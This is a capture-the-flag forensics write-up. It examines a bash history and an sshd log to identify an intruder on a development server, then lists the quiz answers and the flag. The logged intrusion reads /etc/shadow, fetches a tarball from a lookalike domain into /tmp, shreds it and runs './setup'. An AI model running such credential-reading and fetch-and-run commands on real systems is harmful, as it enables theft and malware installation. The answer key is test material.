# An unusual sighting

# An unusual sighting

### Description

POINTS: 450\

\
DIFFICULTY: very easy

As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!


::: details bash_history.txt
```txt
[2024-02-13 11:31:01] useradd -mG sudo softdev
[2024-02-13 11:32:12] passwd softdev
[2024-02-13 11:33:13] apt update && apt install wget gpg
[2024-02-13 11:35:01] wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg
[2024-02-13 11:36:28] install -D -o root -g root -m 644 packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg
[2024-02-13 11:37:01] sh -c 'echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" > /etc/apt/sources.list.d/vscode.list'
[2024-02-13 11:37:58] apt update && apt install python3 python-is-python3 code git
[2024-02-13 11:38:10] git clone https://git.korp.htb/cmd_dev1.git
[2024-02-13 11:39:10] chown -R softdev:softdev ../dev_project
[2024-02-13 11:40:01] sudo -u softdev python -m venv cms
[2024-02-13 11:40:58] source ./cms/bin/activate
[2024-02-13 11:42:01] python -m pip install -r requirements.txt
[2024-02-13 11:56:01] python ./server.py
[2024-02-15 10:41:51] ps aux | grep "server.py"
[2024-02-15 18:52:01] nvim server.py
[2024-02-15 18:56:01] source ./cms/bin/activate
[2024-02-15 18:57:01] python ./server.py
[2024-02-16 10:27:11] nvim server.py
[2024-02-16 10:28:29] source ./cms/bin/activate
[2024-02-16 12:38:11] python ./server.py --tests
[2024-02-16 14:40:47] python ./server.py --tests
[2024-02-19 04:00:18] whoami
[2024-02-19 04:00:20] uname -a
[2024-02-19 04:00:40] cat /etc/passwd
[2024-02-19 04:01:01] cat /etc/shadow
[2024-02-19 04:01:15] ps faux
[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
[2024-02-19 04:10:02] tar xvf latest.tar.gz
[2024-02-19 04:12:02] shred -zu latest.tar.gz
[2024-02-19 04:14:02] ./setup
[2024-02-20 11:11:14] nvim server.py
[2024-02-20 11:48:40] source ./cms/bin/activate
[2024-02-20 11:49:29] python ./server.py --tests
[2024-02-20 13:50:14] python ./server.py --tests
[2024-02-20 14:50:04] python ./server.py --tests
[2024-02-21 10:51:27] sudo apt update
[2024-02-21 10:52:58] sudo apt dist-upgrade
[2024-02-21 18:17:59] code .
[2024-02-22 12:09:39] code .
[2024-02-22 12:19:28] source ./cms/bin/activate
[2024-02-22 12:20:10] python ./server.py --verbose 2>1 | tee /tmp/server_logs.log
[2024-02-22 17:20:10] python ./server.py --verbose --tests 2>1 | tee /tmp/server_logs.log
[2024-02-23 10:49:50] source ./cms/bin/activate
[2024-02-23 10:51:19] code .
[2024-02-23 12:50:46] python ./server.py --verbose
[2024-02-23 12:51:19] ps aux | grep "server.py"
[2024-02-23 12:52:01] kill -s SIGUSR1 2561
[2024-02-23 18:18:06] nvim requirements.txt
[2024-02-23 18:19:17] source ./cms/bin/activate
[2024-02-23 18:21:01] python -m pip install -r requirements.txt
[2024-02-24 11:16:08] source ./cms/bin/activate
[2024-02-24 11:17:07] code .
[2024-02-24 13:20:18] pythom ./server.py --tests
[2024-02-24 13:20:25] python ./server.py --tests
[2024-02-24 14:08:18] sudo apt update && sudo apt dist-upgrade
[2024-02-26 10:00:17] nvim requirements.txt
[2024-02-26 10:20:31] source ./cms/bin/activate
[2024-02-26 10:21:20] python -m pip install -r requirements.txt
[2024-02-26 15:07:18] source ./cms/bin/activate
[2024-02-26 15:07:57] code .
[2024-02-26 15:10:57] python ./server.py --verbose --tests 2>1 | tee /tmp/server_logs.log
[2024-02-26 17:27:10] cat /tmp/server_logs.log | grep "CRITICAL"
[2024-02-26 18:30:46] python ./server.py --verbose --tests 2>1 | tee /tmp/server_logs.log
[2024-02-26 18:37:10] cat /tmp/server_logs.log | grep "CRITICAL"
[2024-02-27 13:42:37] source ./cms/bin/activate
[2024-02-27 13:43:09] code .
[2024-02-27 13:59:01] python ./server.py --verbose
[2024-02-27 14:30:29] python ./server.py --verbose
[2024-02-27 15:31:59] python ./server.py --verbose
[2024-02-27 15:58:18] python ./server.py --verbose
[2024-02-27 17:16:39] python ./server.py --verbose
[2024-02-28 17:19:50] code .
[2024-02-28 18:28:01] git add .
[2024-02-28 18:37:09] git commit -m "[WIP] Add Initial Refactor"
[2024-02-28 18:40:11] git push
[2024-02-29 09:58:14] code .
[2024-02-29 10:20:14] source ./cms/bin/activate
[2024-02-29 10:23:14] python ./server.py --headless
[2024-02-29 18:01:50] code . 
[2024-02-29 18:20:11] srouce ./cms/bin/activate
[2024-02-29 18:20:18] source ./cms/bin/activate
[2024-02-29 18:21:19] python ./server.py
[2024-02-29 18:50:20] git add .
[2024-02-29 18:51:45] git commit -m "[WIP] Add daemon mode"
[2024-02-29 18:52:20] git push
```
:::


::: details sshd.log
```log
[2024-01-19 12:59:11] Server listening on 0.0.0.0 port 2221.
[2024-01-19 12:59:11] Server listening on :: port 2221.
[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain ""
[2024-01-28 15:24:24] Failed publickey for root from 100.72.1.95 port 47721 ssh2: ECDSA SHA256:E5niDfUPHiDYyqgzSsVH_pHW3lKVqGnZTlPDIXoK5sU
[2024-01-28 15:24:33] Failed password for root from 100.72.1.95 port 47721 ssh2
[2024-01-28 15:24:39] Failed password for root from 100.72.1.95 port 47721 ssh2
[2024-01-28 15:24:43] Failed password for root from 100.72.1.95 port 47721 ssh2
[2024-01-28 15:24:43] Connection closed by authenticating user root 100.72.1.95 port 47721 [preauth]
[2024-02-13 11:29:50] Connection from 100.81.51.199 port 63172 on 100.107.36.130 port 2221 rdomain ""
[2024-02-13 11:29:50] Failed publickey for root from 100.81.51.199 port 63172 ssh2: ECDSA SHA256:NdSnAx2935O7s2KX4LyvIV0gCzzQW5eXYoiiIBosqNE
[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2
[2024-02-13 11:29:50] Starting session: shell on pts/2 for root from 100.81.51.199 port 63172 id 0
[2024-02-13 11:57:16] syslogin_perform_logout: logout() returned an error
[2024-02-13 11:57:16] Received disconnect from 100.81.51.199 port 63172:11: disconnected by user
[2024-02-13 11:57:16] Disconnected from user root 100.81.51.199 port 63172
[2024-02-15 10:40:47] Connection from 101.111.18.92 port 44711 on 100.107.36.130 port 2221 rdomain ""
[2024-02-15 10:40:48] Failed publickey for softdev from 101.111.18.92 port 44711 ssh2: ECDSA SHA256:TMRAzI8Xehi9UN05pl5PypfDmgKC_5TDKW01T03k6H0
[2024-02-15 10:40:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
[2024-02-15 10:40:51] Starting session: shell on pts/2 for softdev from 101.111.18.92 port 44711 id 0
[2024-02-15 10:42:20] syslogin_perform_logout: logout() returned an error
[2024-02-15 10:42:20] Received disconnect from 101.111.18.92 port 44711:11: disconnected by user
[2024-02-15 10:42:20] Disconnected from user softdev 101.111.18.92 port 44711
[2024-02-15 18:51:47] Connection from 101.111.18.92 port 44711 on 100.107.36.130 port 2221 rdomain ""
[2024-02-15 18:51:48] Failed publickey for softdev from 101.111.18.92 port 44711 ssh2: ECDSA SHA256:TMRAzI8Xehi9UN05pl5PypfDmgKC_5TDKW01T03k6H0
[2024-02-15 18:51:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
[2024-02-15 18:51:51] Starting session: shell on pts/2 for softdev from 101.111.18.92 port 44711 id 0
[2024-02-15 18:59:39] syslogin_perform_logout: logout() returned an error
[2024-02-15 18:59:39] Received disconnect from 101.111.18.92 port 44711:11: disconnected by user
[2024-02-15 18:59:39] Disconnected from user softdev 101.111.18.92 port 44711
[2024-02-16 10:26:47] Connection from 100.86.71.224 port 58713 on 100.107.36.130 port 2221 rdomain ""
[2024-02-16 10:26:48] Failed publickey for softdev from 100.86.71.224 port 58713 ssh2: ECDSA SHA256:p2aapGz1SWK8ioSXxVzrvI4qKjpCPLIj2e421Wf4Hk8
[2024-02-16 10:26:50] Accepted password for softdev from 100.86.71.224 port 58713 ssh2
[2024-02-16 10:26:51] Starting session: shell on pts/2 for softdev from 100.86.71.224 port 58713 id 0
[2024-02-16 14:47:28] syslogin_perform_logout: logout() returned an error
[2024-02-16 14:47:28] Received disconnect from 100.86.71.224 port 58713:11: disconnected by user
[2024-02-16 14:47:28] Disconnected from user softdev 100.86.71.224 port 58713
[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain ""
[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
[2024-02-19 04:00:14] Starting session: shell on pts/2 for root from 2.67.182.119 port 60071 id 0
[2024-02-19 04:38:17] syslogin_perform_logout: logout() returned an error
[2024-02-19 04:38:17] Received disconnect from 2.67.182.119 port 60071:11: disconnected by user
[2024-02-19 04:38:17] Disconnected from user root 2.67.182.119 port 60071
[2024-02-20 11:10:14] Connection from 100.87.190.253 port 63371 on 100.107.36.130 port 2221 rdomain ""
[2024-02-20 11:10:14] Failed publickey for softdev from 100.87.190.253 port 63371 ssh2: ECDSA SHA256:iT7NDYA0Uut9UYbA7Io5WpsUNO3KzfD5ekgQwDIIED0
[2024-02-20 11:10:14] Accepted password for softdev from 100.87.190.253 port 63371 ssh2
[2024-02-20 11:10:14] Starting session: shell on pts/2 for softdev from 100.87.190.253 port 63371 id 0
[2024-02-20 14:58:17] syslogin_perform_logout: logout() returned an error
[2024-02-20 14:58:17] Received disconnect from 100.87.190.253 port 63371:11: disconnected by user
[2024-02-20 14:58:17] Disconnected from user softdev 100.87.190.253 port 63371
[2024-02-21 10:49:47] Connection from 102.11.76.9 port 48875 on 100.107.36.130 port 2221 rdomain ""
[2024-02-21 10:49:49] Failed publickey for softdev from 102.11.76.9 port 48875 ssh2: ECDSA SHA256:WRpo-Gc3sYEB3eNWwvPOtgXzuOUGvFjg6VwmPSxu7A0
[2024-02-21 10:49:50] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
[2024-02-21 10:49:50] Starting session: shell on pts/2 for softdev from 102.11.76.9 port 48875 id 0
[2024-02-21 13:11:14] syslogin_perform_logout: logout() returned an error
[2024-02-21 13:11:14] Received disconnect from 102.11.76.9 port 48875:11: disconnected by user
[2024-02-21 13:11:14] Disconnected from user softdev 102.11.76.9 port 48875
[2024-02-21 18:17:47] Connection from 100.7.98.129 port 47765 on 100.107.36.130 port 2221 rdomain ""
[2024-02-21 18:17:49] Failed publickey for softdev from 100.7.98.129 port 47765 ssh2: ECDSA SHA256:gwOkY9JclDkl0lqWwycTCwWEJyR20ym_jCi2_bZxl6I
[2024-02-21 18:17:50] Accepted password for softdev from 100.7.98.129 port 47765 ssh2
[2024-02-21 18:17:50] Starting session: shell on pts/2 for softdev from 100.7.98.129 port 47765 id 0
[2024-02-21 18:59:59] syslogin_perform_logout: logout() returned an error
[2024-02-21 18:59:59] Received disconnect from 100.7.98.129 port 47765:11: disconnected by user
[2024-02-21 18:59:59] Disconnected from user softdev 100.7.98.129 port 47765
[2024-02-22 12:07:14] Connection from 100.11.239.78 port 49811 on 100.107.36.130 port 2221 rdomain ""
[2024-02-22 12:07:14] Failed publickey for softdev from 100.11.239.78 port 49811 ssh2: ECDSA SHA256:ZifUdJhD8lH9ItWyvFPT_AvBKPqSjp4k1APaC4OubmA
[2024-02-22 12:07:14] Accepted password for softdev from 100.11.239.78 port 49811 ssh2
[2024-02-22 12:07:14] Starting session: shell on pts/2 for softdev from 100.11.239.78 port 49811 id 0
[2024-02-22 18:59:59] syslogin_perform_logout: logout() returned an error
[2024-02-22 18:59:59] Received disconnect from 100.11.239.78 port 49811:11: disconnected by user
[2024-02-22 18:59:59] Disconnected from user softdev 100.11.239.78 port 49811
[2024-02-23 10:49:47] Connection from 102.11.76.9 port 48875 on 100.107.36.130 port 2221 rdomain ""
[2024-02-23 10:49:49] Failed publickey for softdev from 102.11.76.9 port 48875 ssh2: ECDSA SHA256:WRpo-Gc3sYEB3eNWwvPOtgXzuOUGvFjg6VwmPSxu7A0
[2024-02-23 10:49:50] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
[2024-02-23 10:49:50] Starting session: shell on pts/2 for softdev from 102.11.76.9 port 48875 id 0
[2024-02-23 13:11:14] syslogin_perform_logout: logout() returned an error
[2024-02-23 13:11:14] Received disconnect from 102.11.76.9 port 48875:11: disconnected by user
[2024-02-23 13:11:14] Disconnected from user softdev 102.11.76.9 port 48875
[2024-02-23 18:17:47] Connection from 100.7.98.129 port 47765 on 100.107.36.130 port 2221 rdomain ""
[2024-02-23 18:17:49] Failed publickey for softdev from 100.7.98.129 port 47765 ssh2: ECDSA SHA256:gwOkY9JclDkl0lqWwycTCwWEJyR20ym_jCi2_bZxl6I
[2024-02-23 18:17:50] Accepted password for softdev from 100.7.98.129 port 47765 ssh2
[2024-02-23 18:17:50] Starting session: shell on pts/2 for softdev from 100.7.98.129 port 47765 id 0
[2024-02-23 18:59:59] syslogin_perform_logout: logout() returned an error
[2024-02-23 18:59:59] Received disconnect from 100.7.98.129 port 47765:11: disconnected by user
[2024-02-23 18:59:59] Disconnected from user softdev 100.7.98.129 port 47765
[2024-02-24 11:15:08] Connection from 102.11.76.9 port 48875 on 100.107.36.130 port 2221 rdomain ""
[2024-02-24 11:15:08] Failed publickey for softdev from 102.11.76.9 port 48875 ssh2: ECDSA SHA256:WRpo-Gc3sYEB3eNWwvPOtgXzuOUGvFjg6VwmPSxu7A0
[2024-02-24 11:15:08] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
[2024-02-24 11:15:08] Starting session: shell on pts/2 for softdev from 102.11.76.9 port 48875 id 0
[2024-02-24 13:27:02] syslogin_perform_logout: logout() returned an error
[2024-02-24 13:27:02] Received disconnect from 102.11.76.9 port 48875:11: disconnected by user
[2024-02-24 13:27:02] Disconnected from user softdev 102.11.76.9 port 48875
[2024-02-24 14:07:18] Connection from 100.7.98.129 port 47765 on 100.107.36.130 port 2221 rdomain ""
[2024-02-24 14:07:18] Failed publickey for softdev from 100.7.98.129 port 47765 ssh2: ECDSA SHA256:gwOkY9JclDkl0lqWwycTCwWEJyR20ym_jCi2_bZxl6I
[2024-02-24 14:07:18] Accepted password for softdev from 100.7.98.129 port 47765 ssh2
[2024-02-24 14:07:18] Starting session: shell on pts/2 for softdev from 100.7.98.129 port 47765 id 0
[2024-02-24 15:11:02] syslogin_perform_logout: logout() returned an error
[2024-02-24 15:11:02] Received disconnect from 100.7.98.129 port 47765:11: disconnected by user
[2024-02-24 15:11:02] Disconnected from user softdev 100.7.98.129 port 47765
[2024-02-26 09:57:01] Connection from 102.11.76.9 port 48875 on 100.107.36.130 port 2221 rdomain ""
[2024-02-26 09:57:01] Failed publickey for softdev from 102.11.76.9 port 48875 ssh2: ECDSA SHA256:WRpo-Gc3sYEB3eNWwvPOtgXzuOUGvFjg6VwmPSxu7A0
[2024-02-26 09:57:01] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
[2024-02-26 09:57:01] Starting session: shell on pts/2 for softdev from 102.11.76.9 port 48875 id 0
[2024-02-26 10:31:19] syslogin_perform_logout: logout() returned an error
[2024-02-26 10:31:19] Received disconnect from 102.11.76.9 port 48875:11: disconnected by user
[2024-02-26 10:31:19] Disconnected from user softdev 102.11.76.9 port 48875
[2024-02-26 15:07:18] Connection from 100.7.98.129 port 47765 on 100.107.36.130 port 2221 rdomain ""
[2024-02-26 15:07:18] Failed publickey for softdev from 100.7.98.129 port 47765 ssh2: ECDSA SHA256:gwOkY9JclDkl0lqWwycTCwWEJyR20ym_jCi2_bZxl6I
[2024-02-26 15:07:18] Accepted password for softdev from 100.7.98.129 port 47765 ssh2
[2024-02-26 15:07:18] Starting session: shell on pts/2 for softdev from 100.7.98.129 port 47765 id 0
[2024-02-26 18:59:59] syslogin_perform_logout: logout() returned an error
[2024-02-26 18:59:59] Received disconnect from 100.7.98.129 port 47765:11: disconnected by user
[2024-02-26 18:59:59] Disconnected from user softdev 100.7.98.129 port 47765
[2024-02-27 13:41:23] Connection from 100.85.206.20 port 60630 on 100.107.36.130 port 2221 rdomain ""
[2024-02-27 13:41:24] Failed publickey for softdev from 100.85.206.20 port 60630 ssh2: ECDSA SHA256:7xA/BapXld3P6vebjXLGCTevrJID/MEFDiYwUVFYQMM
[2024-02-27 13:41:33] Failed password for softdev from 100.85.206.20 port 60630 ssh2
[2024-02-27 13:41:39] Failed password for softdev from 100.85.206.20 port 60630 ssh2
[2024-02-27 13:41:43] Failed password for softdev from 100.85.206.20 port 60630 ssh2
[2024-02-27 13:41:43] Connection closed by authenticating user softdev 100.85.206.20 port 60630 [preauth]
[2024-02-27 13:41:48] Connection from 100.85.206.20 port 54976 on 100.107.36.130 port 2221 rdomain ""
[2024-02-27 13:41:48] Failed publickey for softdev from 100.85.206.20 port 54976 ssh2: ECDSA SHA256:7xA/BapXld3P6vebjXLGCTevrJID/MEFDiYwUVFYQMM
[2024-02-27 13:41:51] Accepted password for softdev from 100.85.206.20 port 54976 ssh2
[2024-02-27 13:41:51] Starting session: shell on pts/2 for softdev from 100.85.206.20 port 54976 id 0
[2024-02-27 18:39:16] syslogin_perform_logout: logout() returned an error
[2024-02-27 18:39:16] Received disconnect from 100.85.206.20 port 54976:11: disconnected by user
[2024-02-27 18:39:16] Disconnected from user softdev 100.85.206.20 port 54976
[2024-02-28 17:19:47] Connection from 100.7.98.129 port 47765 on 100.107.36.130 port 2221 rdomain ""
[2024-02-28 17:19:49] Failed publickey for softdev from 100.7.98.129 port 47765 ssh2: ECDSA SHA256:gwOkY9JclDkl0lqWwycTCwWEJyR20ym_jCi2_bZxl6I
[2024-02-28 17:19:50] Accepted password for softdev from 100.7.98.129 port 47765 ssh2
[2024-02-28 17:19:50] Starting session: shell on pts/2 for softdev from 100.7.98.129 port 47765 id 0
[2024-02-28 18:59:59] syslogin_perform_logout: logout() returned an error
[2024-02-28 18:59:59] Received disconnect from 100.7.98.129 port 47765:11: disconnected by user
[2024-02-28 18:59:59] Disconnected from user softdev 100.7.98.129 port 47765
[2024-02-29 09:57:01] Connection from 102.11.76.9 port 48875 on 100.107.36.130 port 2221 rdomain ""
[2024-02-29 09:57:01] Failed publickey for softdev from 102.11.76.9 port 48875 ssh2: ECDSA SHA256:WRpo-Gc3sYEB3eNWwvPOtgXzuOUGvFjg6VwmPSxu7A0
[2024-02-29 09:57:01] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
[2024-02-29 09:57:01] Starting session: shell on pts/2 for softdev from 102.11.76.9 port 48875 id 0
[2024-02-29 10:31:19] syslogin_perform_logout: logout() returned an error
[2024-02-29 10:31:19] Received disconnect from 102.11.76.9 port 48875:11: disconnected by user
[2024-02-29 10:31:19] Disconnected from user softdev 102.11.76.9 port 48875
[2024-02-29 18:01:28] Connection from 100.7.98.129 port 47765 on 100.107.36.130 port 2221 rdomain ""
[2024-02-29 18:01:29] Failed publickey for softdev from 100.7.98.129 port 47765 ssh2: ECDSA SHA256:gwOkY9JclDkl0lqWwycTCwWEJyR20ym_jCi2_bZxl6I
[2024-02-29 18:01:29] Accepted password for softdev from 100.7.98.129 port 47765 ssh2
[2024-02-29 18:01:29] Starting session: shell on pts/2 for softdev from 100.7.98.129 port 47765 id 0
[2024-02-29 18:59:59] syslogin_perform_logout: logout() returned an error
[2024-02-29 18:59:59] Received disconnect from 100.7.98.129 port 47765:11: disconnected by user
[2024-02-29 18:59:59] Disconnected from user softdev 100.7.98.129 port 47765
```
:::

### Solution

We are given a netcat IP:PORT to connect to for answers and 2 files to submit answers from.

```log
➜ ncat 94.237.49.166 36744

+---------------------+---------------------------------------------------------------------------------------------------------------------+
|        Title        |                                                     Description                                                     |
+---------------------+---------------------------------------------------------------------------------------------------------------------+
| An unusual sighting |                        As the preparations come to an end, and The Fray draws near each day,                        |
|                     |             our newly established team has started work on refactoring the new CMS application for the competition. |
|                     |                  However, after some time we noticed that a lot of our work mysteriously has been disappearing!     |
|                     |                     We managed to extract the SSH Logs and the Bash History from our dev server in question.        |
|                     |               The faction that manages to uncover the perpetrator will have a massive bonus come the competition!   |
|                     |                                                                                                                     |
|                     |                                            Note: Operating Hours of Korp: 0900 - 1900                               |
+---------------------+---------------------------------------------------------------------------------------------------------------------+


Note 2: All timestamps are in the format they appear in the logs

What is the IP Address and Port of the SSH Server (IP:PORT)
> 100.107.36.130:2221
[+] Correct!

What time is the first successful Login
> 2024-02-13 11:29:50
[+] Correct!

> 2024-02-19 04:00:14 # Outside working hours, sussy baka
[+] Correct!

What is the Fingerprint of the attacker's public key
> OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4 # In ssh.log, SHA256:Fingerprint
[+] Correct!

What is the first command the attacker executed after logging in
> whoami
[+] Correct!

What is the final command the attacker executed before logging out
> ./setup
[+] Correct!

[+] Here is the flag: HTB{B3sT_0f_luck_1n_th3_Fr4y!!}
```

::: tip Flag
`HTB{B3sT\_0f\_luck\_1n\_th3\_Fr4y!!}`
:::
